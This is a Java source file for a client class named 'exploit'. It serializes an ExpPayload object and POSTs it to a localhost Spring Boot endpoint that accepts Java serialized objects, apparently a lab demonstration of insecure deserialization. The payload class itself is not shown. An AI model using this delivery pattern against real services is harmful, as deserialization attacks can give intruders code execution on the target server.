package com.example.client;

import com.example.spring_boot.Patient;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class exploit {
    public static void main(String[] args)
    {
        try
        {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(new ExpPayload());
            oos.flush();
            byte[] serializedData = bos.toByteArray();
            oos.close();

            HttpClient client = HttpClient.newHttpClient();

            System.out.println(serializedData.length);

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("http://localhost:8080/api/receiveObject"))
                    .header("Content-Type", "application/x-java-serialized-object")
                    .POST(HttpRequest.BodyPublishers.ofByteArray(serializedData))
                    .build();


            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            System.out.println("Response Status Code: " + response.statusCode());
            System.out.println("Response Body: " + response.body());

        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
